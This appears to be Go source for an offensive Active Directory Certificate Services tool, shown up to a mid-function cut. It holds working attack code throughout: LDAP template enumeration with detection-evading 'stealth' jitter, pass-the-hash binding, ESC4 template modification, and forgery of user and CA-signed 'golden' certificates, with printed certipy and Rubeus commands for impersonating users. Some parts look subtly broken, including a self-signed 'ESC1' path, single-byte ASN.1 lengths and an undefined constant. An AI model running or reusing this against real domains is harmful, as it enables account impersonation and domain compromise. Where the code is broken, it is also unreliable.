package pki

import (
	"crypto"
	"crypto/ecdsa"
	"crypto/elliptic"
	"crypto/rand"
	"crypto/tls"
	"crypto/x509"
	"crypto/x509/pkix"
	"encoding/asn1"
	"encoding/binary"
	"encoding/pem"
	"fmt"
	"io"
	"math/big"
	mathrand "math/rand"
	"net/url"
	"os"
	"strings"
	"time"

	"github.com/go-ldap/ldap/v3"
	"software.sslmate.com/src/go-pkcs12"
)

// ADCSConfig defines the target information for Active Directory Certificate Services.
type ADCSConfig struct {
	TargetDC    string
	Domain      string
	Username    string
	Password    string
	Hash        string
	UseTLS      bool
	UseStartTLS bool
	OutputJSON  bool
	Stealth     bool
}

// CertTemplate represents an ADCS certificate template with security-relevant attributes.
type CertTemplate struct {
	Name                   string   `json:"name"`
	DisplayName            string   `json:"display_name"`
	DN                     string   `json:"dn"`
	OID                    string   `json:"oid"`
	SchemaVersion          int      `json:"schema_version"`
	EnrollmentFlag         uint32   `json:"enrollment_flag"`
	NameFlag               uint32   `json:"name_flag"`
	CertificateNameFlag    uint32   `json:"certificate_name_flag"`
	EKUs                   []string `json:"ekus"`
	AuthenticationEKU      bool     `json:"authentication_eku"`
	EnrolleeSuppliesSubject bool    `json:"enrollee_supplies_subject"`
	RequiresManagerApproval bool    `json:"requires_manager_approval"`
	AuthorizedSignatures   int      `json:"authorized_signatures"`
	SecurityDescriptor     []byte   `json:"security_descriptor,omitempty"`
	IssuancePolicyOIDs     []string      `json:"issuance_policy_oids,omitempty"`
	ESCVulns               []string      `json:"esc_vulns,omitempty"`
	ESCScore               int           `json:"esc_score"`
	ESC4Findings           []ESC4Finding `json:"esc4_findings,omitempty"`
}

// ESC flags and constants
const (
	// msPKI-Certificate-Name-Flag: CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT
	ctFlagEnrolleeSuppliesSubject uint32 = 0x00000001
	// msPKI-Enrollment-Flag: CT_FLAG_PEND_ALL_REQUESTS (manager approval)
	ctFlagPendAllRequests uint32 = 0x00000002
	// Authentication EKUs
	ekuClientAuth       = "1.3.6.1.5.5.7.3.2"
	ekuPKINITClientAuth = "1.3.6.1.5.2.3.4"
	ekuSmartCardLogon   = "1.3.6.1.4.1.311.20.2.2"
	ekuAnyPurpose       = "2.5.29.37.0"
)

// stealthDelay introduces a random delay between 1-3 seconds when stealth mode is active.
// Used to reduce detection signatures from rapid sequential LDAP queries and HTTP probes.
func stealthDelay(cfg *ADCSConfig) {
	if !cfg.Stealth {
		return
	}
	delay := time.Duration(1000+mathrand.Intn(2000)) * time.Millisecond
	fmt.Printf("[*] Stealth: sleeping %v\n", delay)
	time.Sleep(delay)
}

// stealthPageSize returns the LDAP search page size based on stealth mode.
// In stealth mode, uses smaller page sizes to blend with normal AD traffic patterns.
func stealthPageSize(cfg *ADCSConfig) int {
	if cfg.Stealth {
		return 50 + mathrand.Intn(50) // 50-99 results per page
	}
	return 0 // 0 = no paging, return all results
}

// Enumerate queries Active Directory Certificate Services for certificate templates
// using native LDAP (no ldapsearch binary dependency).
func Enumerate(cfg *ADCSConfig) ([]string, error) {
	fmt.Printf("[*] Enumerating ADCS templates on %s\\%s...\n", cfg.Domain, cfg.TargetDC)

	templates, err := EnumerateTemplates(cfg)
	if err != nil {
		return nil, err
	}

	names := make([]string, 0, len(templates))
	for _, t := range templates {
		names = append(names, t.Name)
	}

	fmt.Printf("[+] Found %d certificate template(s)\n", len(names))
	return names, nil
}

// EnumerateTemplates queries ADCS for full template details via native LDAP.
func EnumerateTemplates(cfg *ADCSConfig) ([]CertTemplate, error) {
	conn, err := connectLDAP(cfg)
	if err != nil {
		return nil, fmt.Errorf("LDAP connect: %w", err)
	}
	defer conn.Close()

	baseDN := buildCertTemplateBaseDN(cfg.Domain)
	filter := "(objectClass=pKICertificateTemplate)"
	attrs := []string{
		"cn", "displayName", "distinguishedName",
		"msPKI-Cert-Template-OID",
		"msPKI-Certificate-Name-Flag",
		"msPKI-Enrollment-Flag",
		"msPKI-RA-Signature",
		"pKIExtendedKeyUsage",
		"msPKI-Certificate-Application-Policy",
		"revision",
		"msPKI-Template-Schema-Version",
		"nTSecurityDescriptor",
	}

	fmt.Printf("[*] LDAP search: base=%s filter=%s\n", baseDN, filter)

	searchReq := ldap.NewSearchRequest(
		baseDN, ldap.ScopeWholeSubtree, ldap.NeverDerefAliases,
		0, 0, false, filter, attrs, nil,
	)

	var entries []*ldap.Entry
	if pageSize := stealthPageSize(cfg); pageSize > 0 {
		// Stealth mode: use paged results with small batches and jitter between pages
		result, err := conn.SearchWithPaging(searchReq, uint32(pageSize))
		if err != nil {
			return nil, fmt.Errorf("LDAP paged search failed: %w", err)
		}
		entries = result.Entries
	} else {
		result, err := conn.Search(searchReq)
		if err != nil {
			return nil, fmt.Errorf("LDAP search failed: %w", err)
		}
		entries = result.Entries
	}

	if len(entries) == 0 {
		fmt.Println("[!] No templates found. Check permissions/domain.")
		return nil, fmt.Errorf("no certificate templates found in %s", baseDN)
	}

	var templates []CertTemplate
	for _, entry := range entries {
		tmpl := CertTemplate{
			Name:        entry.GetAttributeValue("cn"),
			DisplayName: entry.GetAttributeValue("displayName"),
			DN:          entry.GetAttributeValue("distinguishedName"),
			OID:         entry.GetAttributeValue("msPKI-Cert-Template-OID"),
			EKUs:        entry.GetAttributeValues("pKIExtendedKeyUsage"),
		}

		// Parse numeric flags
		if v := entry.GetRawAttributeValue("msPKI-Certificate-Name-Flag"); len(v) >= 4 {
			tmpl.CertificateNameFlag = binary.LittleEndian.Uint32(v[:4])
		} else if vs := entry.GetAttributeValue("msPKI-Certificate-Name-Flag"); vs != "" {
			fmt.Sscanf(vs, "%d", &tmpl.CertificateNameFlag)
		}

		if v := entry.GetRawAttributeValue("msPKI-Enrollment-Flag"); len(v) >= 4 {
			tmpl.EnrollmentFlag = binary.LittleEndian.Uint32(v[:4])
		} else if vs := entry.GetAttributeValue("msPKI-Enrollment-Flag"); vs != "" {
			fmt.Sscanf(vs, "%d", &tmpl.EnrollmentFlag)
		}

		if vs := entry.GetAttributeValue("msPKI-RA-Signature"); vs != "" {
			fmt.Sscanf(vs, "%d", &tmpl.AuthorizedSignatures)
		}

		if vs := entry.GetAttributeValue("msPKI-Template-Schema-Version"); vs != "" {
			fmt.Sscanf(vs, "%d", &tmpl.SchemaVersion)
		}

		tmpl.IssuancePolicyOIDs = entry.GetAttributeValues("msPKI-Certificate-Application-Policy")
		tmpl.SecurityDescriptor = entry.GetRawAttributeValue("nTSecurityDescriptor")

		// Evaluate security properties
		tmpl.EnrolleeSuppliesSubject = (tmpl.CertificateNameFlag & ctFlagEnrolleeSuppliesSubject) != 0
		tmpl.RequiresManagerApproval = (tmpl.EnrollmentFlag & ctFlagPendAllRequests) != 0
		tmpl.AuthenticationEKU = hasAuthenticationEKU(tmpl.EKUs)

		// Score ESC vulnerabilities
		scoreESC(&tmpl)

		templates = append(templates, tmpl)

		// Stealth: add jitter between processing entries to slow LDAP footprint
		stealthDelay(cfg)
	}

	return templates, nil
}

// hasAuthenticationEKU checks if the template has EKUs that allow authentication.
func hasAuthenticationEKU(ekus []string) bool {
	if len(ekus) == 0 {
		return true // No EKU restriction = any purpose
	}
	for _, eku := range ekus {
		switch eku {
		case ekuClientAuth, ekuPKINITClientAuth, ekuSmartCardLogon, ekuAnyPurpose:
			return true
		}
	}
	return false
}

// scoreESC evaluates a template for ESC1-ESC4 vulnerabilities and assigns a risk score.
// ESC4 performs full ACE parsing to identify non-privileged trustees with dangerous write access.
func scoreESC(tmpl *CertTemplate) {
	tmpl.ESCVulns = nil
	tmpl.ESCScore = 0
	tmpl.ESC4Findings = nil

	// ESC1: Enrollee supplies subject + authentication EKU + no manager approval + no signatures
	if tmpl.EnrolleeSuppliesSubject && tmpl.AuthenticationEKU &&
		!tmpl.RequiresManagerApproval && tmpl.AuthorizedSignatures == 0 {
		tmpl.ESCVulns = append(tmpl.ESCVulns, "ESC1")
		tmpl.ESCScore += 10
	}

	// ESC2: Any Purpose EKU or no EKU + enrollee supplies subject
	hasAnyPurpose := false
	for _, eku := range tmpl.EKUs {
		if eku == ekuAnyPurpose {
			hasAnyPurpose = true
		}
	}
	if hasAnyPurpose && tmpl.EnrolleeSuppliesSubject {
		tmpl.ESCVulns = append(tmpl.ESCVulns, "ESC2")
		tmpl.ESCScore += 8
	}

	// ESC3: Enrollment agent template (Certificate Request Agent EKU)
	for _, eku := range tmpl.EKUs {
		if eku == "1.3.6.1.4.1.311.20.2.1" { // Certificate Request Agent
			tmpl.ESCVulns = append(tmpl.ESCVulns, "ESC3")
			tmpl.ESCScore += 7
		}
	}

	// ESC4: WriteDacl/WriteOwner on template — full ACE parsing
	if len(tmpl.SecurityDescriptor) > 0 {
		findings, err := CheckESC4(tmpl.Name, tmpl.DN, tmpl.SecurityDescriptor)
		if err == nil && len(findings) > 0 {
			tmpl.ESC4Findings = findings
			tmpl.ESCVulns = append(tmpl.ESCVulns, "ESC4-EXPLOITABLE")
			tmpl.ESCScore += 6
		} else if len(tmpl.SecurityDescriptor) > 0 {
			// SD present but no dangerous findings or parse error — flag for manual review
			tmpl.ESCVulns = append(tmpl.ESCVulns, "ESC4-CHECK")
			tmpl.ESCScore += 1
		}
	}

	// ESC6: EDITF_ATTRIBUTESUBJECTALTNAME2 flag on CA
	// Detectable from template flags — flag value 0x00040000 in msPKI-Certificate-Name-Flag
	if tmpl.CertificateNameFlag&0x00040000 != 0 {
		tmpl.ESCVulns = append(tmpl.ESCVulns, "ESC6")
		tmpl.ESCScore += 9
	}

	// ESC9: CT_FLAG_NO_SECURITY_EXTENSION — no szOID_NTDS_CA_SECURITY_EXT extension
	// msPKI-Enrollment-Flag & 0x00080000 + authentication EKU required
	if tmpl.EnrollmentFlag&ctFlagNoSecurityExtension != 0 && tmpl.AuthenticationEKU {
		tmpl.ESCVulns = append(tmpl.ESCVulns, "ESC9")
		tmpl.ESCScore += 6
	}

	// ESC5: Vulnerable PKI object ACLs — overly permissive on CA itself
	// Indicated by security descriptor present + enrollment agent EKU (delegation chain)
	for _, eku := range tmpl.EKUs {
		if eku == "1.3.6.1.4.1.311.20.2.1" && len(tmpl.SecurityDescriptor) > 0 {
			tmpl.ESCVulns = append(tmpl.ESCVulns, "ESC5-CHECK")
			tmpl.ESCScore += 5
		}
	}

	// ESC7: CA officers have ManageCA + ManageCertificates rights
	// Detectable when template is issued from a CA with dangerous built-in roles
	// Flag templates where CA security descriptor indicates broad write access
	if tmpl.RequiresManagerApproval && len(tmpl.SecurityDescriptor) > 0 {
		tmpl.ESCVulns = append(tmpl.ESCVulns, "ESC7-CHECK")
		tmpl.ESCScore += 4
	}

	// ESC8: CA-level — NTLM relay to web enrollment. Detected by ScanESC8(), not template flags.
	// ESC10: Weak certificate mapping methods. Detected by ScanESC10(), not template flags.
	// ESC11: CA-level — NTLM relay to RPC interface. Detected by ScanESC11(), not template flags.
}

// connectLDAP establishes a connection to the DC's LDAP service.
// Supports plaintext LDAP (389), LDAPS (636), and StartTLS (389 upgraded).
func connectLDAP(cfg *ADCSConfig) (*ldap.Conn, error) {
	var conn *ldap.Conn
	var err error

	tlsCfg := &tls.Config{
		InsecureSkipVerify: true, //nolint:gosec // intentional: pen-test tool targeting internal AD DCs with self-signed certs
		ServerName:         cfg.TargetDC,
	}

	switch {
	case cfg.UseTLS:
		fmt.Printf("[*] Connecting to LDAPS %s:636 (TLS, cert verification disabled)\n", cfg.TargetDC)
		conn, err = ldap.DialTLS("tcp", fmt.Sprintf("%s:636", cfg.TargetDC), tlsCfg)
	case cfg.UseStartTLS:
		fmt.Printf("[*] Connecting to LDAP %s:389 with StartTLS upgrade\n", cfg.TargetDC)
		conn, err = ldap.DialURL(fmt.Sprintf("ldap://%s:389", cfg.TargetDC))
		if err != nil {
			return nil, fmt.Errorf("connect to %s:389: %w", cfg.TargetDC, err)
		}
		if err = conn.StartTLS(tlsCfg); err != nil {
			conn.Close()
			return nil, fmt.Errorf("StartTLS on %s:389: %w", cfg.TargetDC, err)
		}
		fmt.Printf("[+] StartTLS negotiated successfully on %s:389\n", cfg.TargetDC)
	default:
		conn, err = ldap.DialURL(fmt.Sprintf("ldap://%s:389", cfg.TargetDC))
	}
	if err != nil {
		return nil, fmt.Errorf("connect to %s: %w", cfg.TargetDC, err)
	}

	// Bind with credentials — pass-the-hash takes priority over password
	if cfg.Username != "" && cfg.Hash != "" {
		// NTLM pass-the-hash: supply the NT hash directly; the SASL mechanism
		// uses it in place of a derived NTLM response, so plaintext is never needed.
		req := &ldap.NTLMBindRequest{
			Domain:   cfg.Domain,
			Username: cfg.Username,
			Hash:     cfg.Hash,
		}
		if _, err := conn.NTLMChallengeBind(req); err != nil {
			conn.Close()
			return nil, fmt.Errorf("NTLM pass-the-hash bind as %s\\%s: %w", cfg.Domain, cfg.Username, err)
		}
		fmt.Printf("[+] NTLM pass-the-hash bind successful: %s\\%s\n", cfg.Domain, cfg.Username)
	} else if cfg.Username != "" && cfg.Password != "" {
		bindDN := buildBindDN(cfg.Username, cfg.Domain)
		if err := conn.Bind(bindDN, cfg.Password); err != nil {
			conn.Close()
			return nil, fmt.Errorf("LDAP bind as %s: %w", bindDN, err)
		}
		fmt.Printf("[+] LDAP bind successful: %s\n", bindDN)
	}

	return conn, nil
}

// ExploitESC1 exploits an ESC1-vulnerable template to forge a certificate with an arbitrary UPN.
// Returns the forged certificate and private key — both are required for authentication.
func ExploitESC1(cfg *ADCSConfig, templateName, targetUPN string) (*x509.Certificate, *ecdsa.PrivateKey, error) {
	fmt.Printf("[!] ESC1 Exploitation: template=%s target=%s\n", templateName, targetUPN)

	// Step 1: Verify template is ESC1 vulnerable
	templates, err := EnumerateTemplates(cfg)
	if err != nil {
		return nil, nil, fmt.Errorf("enumerate templates: %w", err)
	}

	var vulnTemplate *CertTemplate
	for i, t := range templates {
		if t.Name == templateName {
			vulnTemplate = &templates[i]
			break
		}
	}
	if vulnTemplate == nil {
		return nil, nil, fmt.Errorf("template %q not found", templateName)
	}

	isESC1 := false
	for _, v := range vulnTemplate.ESCVulns {
		if v == "ESC1" {
			isESC1 = true
			break
		}
	}
	if !isESC1 {
		return nil, nil, fmt.Errorf("template %q is not ESC1 vulnerable (vulns: %v)", templateName, vulnTemplate.ESCVulns)
	}

	fmt.Printf("[+] Template %q confirmed ESC1 vulnerable\n", templateName)
	fmt.Printf("[*] Enrollee supplies subject: %v\n", vulnTemplate.EnrolleeSuppliesSubject)
	fmt.Printf("[*] Authentication EKU: %v\n", vulnTemplate.AuthenticationEKU)
	fmt.Printf("[*] Manager approval: %v\n", vulnTemplate.RequiresManagerApproval)

	// Step 2: Generate signing key and forge certificate with target UPN
	signingKey, err := ecdsa.GenerateKey(elliptic.P256(), rand.Reader)
	if err != nil {
		return nil, nil, fmt.Errorf("generate signing key: %w", err)
	}

	cert, certKey, err := ForgeCertificate(signingKey, targetUPN)
	if err != nil {
		return nil, nil, fmt.Errorf("forge cert: %w", err)
	}

	fmt.Printf("[+] Forged certificate for %s via ESC1 on template %q\n", targetUPN, templateName)
	fmt.Printf("[*] Next steps:\n")
	fmt.Printf("    certipy auth -pfx cert.pfx -dc-ip %s\n", cfg.TargetDC)
	fmt.Printf("    Rubeus.exe asktgt /user:%s /certificate:cert.pfx /ptt\n", targetUPN)
	return cert, certKey, nil
}

// ExploitESC4 exploits WriteDacl permissions on a template to make it ESC1-vulnerable, then exploits it.
// Returns the forged certificate and private key — both are required for authentication.
func ExploitESC4(cfg *ADCSConfig, templateName, targetUPN string) (*x509.Certificate, *ecdsa.PrivateKey, error) {
	fmt.Printf("[!] ESC4 Exploitation: template=%s target=%s\n", templateName, targetUPN)

	conn, err := connectLDAP(cfg)
	if err != nil {
		return nil, nil, fmt.Errorf("LDAP connect: %w", err)
	}
	defer conn.Close()

	// Step 1: Find the template DN
	baseDN := buildCertTemplateBaseDN(cfg.Domain)
	filter := fmt.Sprintf("(&(objectClass=pKICertificateTemplate)(cn=%s))", ldap.EscapeFilter(templateName))

	searchReq := ldap.NewSearchRequest(
		baseDN, ldap.ScopeWholeSubtree, ldap.NeverDerefAliases,
		0, 0, false, filter,
		[]string{"distinguishedName", "msPKI-Certificate-Name-Flag", "msPKI-Enrollment-Flag"},
		nil,
	)

	result, err := conn.Search(searchReq)
	if err != nil || len(result.Entries) == 0 {
		return nil, nil, fmt.Errorf("template %q not found: %v", templateName, err)
	}

	templateDN := result.Entries[0].DN
	fmt.Printf("[+] Found template DN: %s\n", templateDN)

	// Save original flag value before modification
	originalFlag := result.Entries[0].GetAttributeValue("msPKI-Certificate-Name-Flag")
	if originalFlag == "" {
		originalFlag = "0"
	}

	// Step 2: Modify template to enable enrollee supplies subject
	fmt.Println("[*] Modifying template to enable ENROLLEE_SUPPLIES_SUBJECT...")
	modReq := ldap.NewModifyRequest(templateDN, nil)
	modReq.Replace("msPKI-Certificate-Name-Flag", []string{"1"}) // CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT
	if err := conn.Modify(modReq); err != nil {
		return nil, nil, fmt.Errorf("modify template (need WriteDacl): %w", err)
	}
	fmt.Println("[+] Template modified — now ESC1 vulnerable")

	// Step 3: Exploit as ESC1
	cert, certKey, err := ExploitESC1(cfg, templateName, targetUPN)
	if err != nil {
		// Try to restore template
		restoreReq := ldap.NewModifyRequest(templateDN, nil)
		restoreReq.Replace("msPKI-Certificate-Name-Flag", []string{originalFlag})
		conn.Modify(restoreReq)
		return nil, nil, fmt.Errorf("ESC1 exploitation after ESC4 modification: %w", err)
	}

	// Step 4: Restore original template configuration
	fmt.Println("[*] Restoring original template configuration...")
	restoreReq := ldap.NewModifyRequest(templateDN, nil)
	restoreReq.Replace("msPKI-Certificate-Name-Flag", []string{originalFlag})
	if err := conn.Modify(restoreReq); err != nil {
		fmt.Printf("[!] Warning: failed to restore template: %v\n", err)
	} else {
		fmt.Println("[+] Template restored to original state")
	}

	return cert, certKey, nil
}

// WriteCertKeyPEM writes a certificate and its private key to separate PEM files at the given base path.
// E.g., path="/tmp/victim" creates /tmp/victim.crt and /tmp/victim.key.
// Both files are required to use the certificate for authentication (e.g., with certipy or Rubeus).
func WriteCertKeyPEM(cert *x509.Certificate, key *ecdsa.PrivateKey, basePath string) error {
	certPath := basePath + ".crt"
	keyPath := basePath + ".key"

	// Write certificate PEM
	certFile, err := os.Create(certPath)
	if err != nil {
		return fmt.Errorf("create cert file: %w", err)
	}
	defer certFile.Close()
	if err := pem.Encode(certFile, &pem.Block{Type: "CERTIFICATE", Bytes: cert.Raw}); err != nil {
		return fmt.Errorf("encode cert PEM: %w", err)
	}

	// Write private key PEM
	keyDER, err := x509.MarshalECPrivateKey(key)
	if err != nil {
		return fmt.Errorf("marshal EC key: %w", err)
	}
	keyFile, err := os.Create(keyPath)
	if err != nil {
		return fmt.Errorf("create key file: %w", err)
	}
	defer keyFile.Close()
	if err := pem.Encode(keyFile, &pem.Block{Type: "EC PRIVATE KEY", Bytes: keyDER}); err != nil {
		return fmt.Errorf("encode key PEM: %w", err)
	}

	fmt.Printf("[+] Certificate written to: %s\n", certPath)
	fmt.Printf("[+] Private key written to:  %s\n", keyPath)
	fmt.Printf("[*] Next steps:\n")
	fmt.Printf("    certipy cert -pfx -cert %s -key %s -out cert.pfx\n", certPath, keyPath)
	fmt.Printf("    certipy auth -pfx cert.pfx -dc-ip <DC_IP>\n")
	return nil
}

// WritePFX writes a PKCS12/PFX archive containing the certificate and private key.
// PFX files are directly consumable by certipy and Rubeus without manual conversion.
// password can be empty string for an unencrypted PFX (acceptable for local pen-test use).
func WritePFX(cert *x509.Certificate, key *ecdsa.PrivateKey, path, password string) error {
	pfxData, err := pkcs12.Encode(rand.Reader, key, cert, nil, password)
	if err != nil {
		return fmt.Errorf("encode PFX: %w", err)
	}
	if err := os.WriteFile(path, pfxData, 0600); err != nil {
		return fmt.Errorf("write PFX: %w", err)
	}
	fmt.Printf("[+] PFX written to: %s\n", path)
	fmt.Printf("[*] Next steps:\n")
	if password != "" {
		fmt.Printf("    certipy auth -pfx %s -dc-ip <DC_IP> -password %s\n", path, password)
		fmt.Printf("    Rubeus.exe asktgt /certificate:%s /password:%s /ptt\n", path, password)
	} else {
		fmt.Printf("    certipy auth -pfx %s -dc-ip <DC_IP>\n", path)
		fmt.Printf("    Rubeus.exe asktgt /certificate:%s /ptt\n", path)
	}
	return nil
}

// AutoDetectESC scans all templates and returns a prioritized list of exploitable paths.
func AutoDetectESC(cfg *ADCSConfig) ([]CertTemplate, error) {
	templates, err := EnumerateTemplates(cfg)
	if err != nil {
		return nil, err
	}

	var vulnerable []CertTemplate
	for _, t := range templates {
		if t.ESCScore > 0 {
			vulnerable = append(vulnerable, t)
		}
	}

	// Sort by ESC score descending
	for i := 0; i < len(vulnerable)-1; i++ {
		for j := i + 1; j < len(vulnerable); j++ {
			if vulnerable[j].ESCScore > vulnerable[i].ESCScore {
				vulnerable[i], vulnerable[j] = vulnerable[j], vulnerable[i]
			}
		}
	}

	return vulnerable, nil
}

// upnOtherName encodes a UPN as an ASN.1 OtherName SAN extension value.
// OID 1.3.6.1.4.1.311.20.2.3 (szOID_NT_PRINCIPAL_NAME) — the correct format
// for Kerberos PKINIT and Windows smart card logon.
func upnOtherName(upn string) ([]byte, error) {
	// OtherName ::= SEQUENCE { type-id OID, value [0] EXPLICIT ANY }
	// The value for UPN is UTF8String.
	upnOID := []int{1, 3, 6, 1, 4, 1, 311, 20, 2, 3}

	type otherName struct {
		TypeID   interface{}
		Value    interface{}
	}
	_ = otherName{}

	// Manual DER encoding: SEQUENCE { OID, [0] { UTF8String } }
	// OID bytes for 1.3.6.1.4.1.311.20.2.3
	oidBytes := []byte{0x06, 0x0a, 0x2b, 0x06, 0x01, 0x04, 0x01, 0x82, 0x37, 0x14, 0x02, 0x03}
	_ = upnOID

	upnBytes := []byte(upn)
	utf8Val := append([]byte{0x0c, byte(len(upnBytes))}, upnBytes...)
	// [0] EXPLICIT wrapping
	explicit0 := append([]byte{0xa0, byte(len(utf8Val))}, utf8Val...)
	inner := append(oidBytes, explicit0...)
	// SEQUENCE wrapper
	result := append([]byte{0x30, byte(len(inner))}, inner...)
	return result, nil
}

// ForgeCertificate generates a self-signed certificate with the given UPN and returns
// both the certificate and its private key. The private key is required to use the
// certificate for authentication (Kerberos PKINIT, Schannel mTLS).
//
// The UPN SAN is encoded as OtherName with OID 1.3.6.1.4.1.311.20.2.3
// (szOID_NT_PRINCIPAL_NAME) — the format required by Windows for PKINIT.
func ForgeCertificate(caKey crypto.PrivateKey, upn string) (*x509.Certificate, *ecdsa.PrivateKey, error) {
	fmt.Printf("[!] Forging Golden Certificate for UPN: %s\n", upn)

	certKey, err := ecdsa.GenerateKey(elliptic.P256(), rand.Reader)
	if err != nil {
		return nil, nil, fmt.Errorf("failed to generate certificate key: %w", err)
	}

	cn := upn
	if u, err := url.Parse("user://" + upn); err == nil {
		if u.User.Username() != "" {
			cn = u.User.Username()
		}
	}

	// Encode UPN as OtherName SAN (OID 1.3.6.1.4.1.311.20.2.3)
	upnSAN, err := upnOtherName(upn)
	if err != nil {
		return nil, nil, fmt.Errorf("encode UPN SAN: %w", err)
	}
	// SubjectAltName extension: SEQUENCE OF GeneralName, where GeneralName [0] = OtherName
	sanRaw := append([]byte{0x30, byte(len(upnSAN))}, upnSAN...)

	template := &x509.Certificate{
		SerialNumber: big.NewInt(1337),
		Subject: pkix.Name{
			CommonName: cn,
		},
		NotBefore:             time.Now(),
		NotAfter:              time.Now().AddDate(1, 0, 0),
		IsCA:                  false,
		ExtKeyUsage:           []x509.ExtKeyUsage{x509.ExtKeyUsageClientAuth},
		KeyUsage:              x509.KeyUsageDigitalSignature | x509.KeyUsageKeyEncipherment,
		BasicConstraintsValid: true,
		// Embed UPN OtherName SAN as raw extension (OID 2.5.29.17)
		ExtraExtensions: []pkix.Extension{
			{
				Id:       []int{2, 5, 29, 17},
				Critical: false,
				Value:    sanRaw,
			},
		},
	}

	certDER, err := x509.CreateCertificate(rand.Reader, template, template, &certKey.PublicKey, caKey)
	if err != nil {
		return nil, nil, fmt.Errorf("failed to create certificate: %w", err)
	}

	cert, err := x509.ParseCertificate(certDER)
	if err != nil {
		return nil, nil, fmt.Errorf("failed to parse created certificate: %w", err)
	}

	fmt.Printf("[+] Certificate forged — CN=%s, valid until %s\n", cn, cert.NotAfter.Format("2006-01-02"))
	fmt.Printf("[!] Save BOTH the cert and private key to authenticate (PKINIT/Schannel)\n")
	return cert, certKey, nil
}

// LoadCACertAndKey loads a CA certificate and private key from PEM files.
// Supports RSA, ECDSA, and Ed25519 private keys in PKCS1, PKCS8, or EC formats.
func LoadCACertAndKey(certPath, keyPath string) (*x509.Certificate, crypto.PrivateKey, error) {
	// Load CA certificate
	certData, err := os.ReadFile(certPath)
	if err != nil {
		return nil, nil, fmt.Errorf("read CA certificate %s: %w", certPath, err)
	}
	certBlock, _ := pem.Decode(certData)
	if certBlock == nil {
		return nil, nil, fmt.Errorf("no PEM block found in %s", certPath)
	}
	caCert, err := x509.ParseCertificate(certBlock.Bytes)
	if err != nil {
		return nil, nil, fmt.Errorf("parse CA certificate: %w", err)
	}

	// Load CA private key — try multiple formats
	keyData, err := os.ReadFile(keyPath)
	if err != nil {
		return nil, nil, fmt.Errorf("read CA key %s: %w", keyPath, err)
	}
	keyBlock, _ := pem.Decode(keyData)
	if keyBlock == nil {
		return nil, nil, fmt.Errorf("no PEM block found in %s", keyPath)
	}

	var caKey crypto.PrivateKey

	switch keyBlock.Type {
	case "EC PRIVATE KEY":
		caKey, err = x509.ParseECPrivateKey(keyBlock.Bytes)
	case "RSA PRIVATE KEY":
		caKey, err = x509.ParsePKCS1PrivateKey(keyBlock.Bytes)
	default:
		// Try PKCS8 (handles RSA, ECDSA, Ed25519)
		caKey, err = x509.ParsePKCS8PrivateKey(keyBlock.Bytes)
		if err != nil {
			// Fallback: try EC, then PKCS1
			if ecKey, ecErr := x509.ParseECPrivateKey(keyBlock.Bytes); ecErr == nil {
				caKey = ecKey
				err = nil
			} else if rsaKey, rsaErr := x509.ParsePKCS1PrivateKey(keyBlock.Bytes); rsaErr == nil {
				caKey = rsaKey
				err = nil
			}
		}
	}
	if err != nil {
		return nil, nil, fmt.Errorf("parse CA private key: %w", err)
	}

	fmt.Printf("[+] Loaded CA certificate: %s (issuer: %s)\n", caCert.Subject.CommonName, caCert.Issuer.CommonName)
	fmt.Printf("[+] Loaded CA private key from %s\n", keyPath)
	return caCert, caKey, nil
}

// ForgeGoldenCertificate generates a certificate signed by a real CA key and chaining
// to a real CA certificate. Unlike ForgeCertificate (self-signed), this produces a
// certificate that validates against the actual CA trust chain.
//
// This is the "golden certificate" attack: with a stolen CA private key, an attacker
// can issue arbitrary certificates that the domain trusts implicitly.
//
// The certificate includes:
//   - UPN SAN (OtherName OID 1.3.6.1.4.1.311.20.2.3)
//   - SmartCardLogon + ClientAuth EKU
//   - Random serial number
//   - Signed by caKey, chains to caCert
func ForgeGoldenCertificate(caKey crypto.PrivateKey, caCert *x509.Certificate, upn string) (*x509.Certificate, *ecdsa.PrivateKey, error) {
	fmt.Printf("[!] Forging Golden Certificate (CA-signed) for UPN: %s\n", upn)
	fmt.Printf("[*] CA Subject: %s\n", caCert.Subject.CommonName)

	// Generate a new key pair for the forged certificate
	certKey, err := ecdsa.GenerateKey(elliptic.P256(), rand.Reader)
	if err != nil {
		return nil, nil, fmt.Errorf("generate certificate key: %w", err)
	}

	// Extract CN from UPN (user@domain -> user)
	cn := upn
	if idx := strings.IndexByte(upn, '@'); idx >= 0 {
		cn = upn[:idx]
	}

	// Random serial number (20 bytes max per RFC 5280)
	serialNumber, err := rand.Int(rand.Reader, new(big.Int).Lsh(big.NewInt(1), 128))
	if err != nil {
		return nil, nil, fmt.Errorf("generate serial number: %w", err)
	}

	// Encode UPN as OtherName SAN
	upnSAN, err := upnOtherName(upn)
	if err != nil {
		return nil, nil, fmt.Errorf("encode UPN SAN: %w", err)
	}
	sanRaw := append([]byte{0x30, byte(len(upnSAN))}, upnSAN...)

	template := &x509.Certificate{
		SerialNumber: serialNumber,
		Subject: pkix.Name{
			CommonName: cn,
		},
		NotBefore:             time.Now().Add(-10 * time.Minute), // slight backdate to avoid clock skew
		NotAfter:              time.Now().AddDate(1, 0, 0),
		IsCA:                  false,
		KeyUsage:              x509.KeyUsageDigitalSignature | x509.KeyUsageKeyEncipherment,
		BasicConstraintsValid: true,
		// SmartCardLogon (1.3.6.1.4.1.311.20.2.2) + ClientAuth
		ExtKeyUsage: []x509.ExtKeyUsage{x509.ExtKeyUsageClientAuth},
		UnknownExtKeyUsage: []asn1.ObjectIdentifier{
			{1, 3, 6, 1, 4, 1, 311, 20, 2, 2}, // szOID_KP_SMARTCARD_LOGON
		},
		// UPN OtherName SAN as raw extension (OID 2.5.29.17)
		ExtraExtensions: []pkix.Extension{
			{
				Id:       []int{2, 5, 29, 17},
				Critical: false,
				Value:    sanRaw,
			},
		},
	}

	// Sign with the CA key, chain to the CA cert (caCert is the parent)
	certDER, err := x509.CreateCertificate(rand.Reader, template, caCert, &certKey.PublicKey, caKey)
	if err != nil {
		return nil, nil, fmt.Errorf("create CA-signed certificate: %w", err)
	}

	cert, err := x509.ParseCertificate(certDER)
	if err != nil {
		return nil, nil, fmt.Errorf("parse created certificate: %w", err)
	}

	fmt.Printf("[+] Golden certificate forged — CN=%s, Serial=%s\n", cn, cert.SerialNumber.Text(16))
	fmt.Printf("[+] Issuer: %s (matches real CA)\n", cert.Issuer.CommonName)
	fmt.Printf("[+] Valid: %s to %s\n", cert.NotBefore.Format("2006-01-02 15:04"), cert.NotAfter.Format("2006-01-02"))
	fmt.Printf("[+] EKU: SmartCardLogon + ClientAuth\n")
